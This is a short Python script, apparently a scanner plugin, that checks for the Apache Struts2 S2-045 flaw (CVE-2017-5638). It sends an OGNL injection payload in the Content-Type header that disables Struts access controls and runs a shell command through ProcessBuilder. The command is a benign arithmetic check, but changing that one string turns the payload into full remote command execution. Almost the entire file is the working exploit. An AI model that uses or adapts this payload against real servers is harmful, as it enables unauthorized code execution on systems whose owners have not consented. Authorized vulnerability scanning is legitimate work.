#!/usr/bin/env python3

'''
name: S2-045漏洞,又名CVE-2017-5638漏洞
description: S2-045漏洞可执行任意命令
'''

import random
from app.lib.utils.request import request


class S2_045_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        if '://' not in self.url:
            self.url = 'http://' + self.url
        try:
            a = random.randint(10000000, 20000000)
            b = random.randint(10000000, 20000000)
            c = a + b
            win = 'set /a ' + str(a) + ' + ' + str(b)
            linux = 'expr ' + str(a) + ' + ' + str(b)

            header = dict()
            header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
            header["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#iswin?(#cmd='" + win + "'):(#cmd='" + linux + "')).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
            req = request.get(self.url, headers = header)
            if str(c) in req.text:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_045 = S2_045_BaseVerify('127.0.0.1:8080')
    S2_045.run()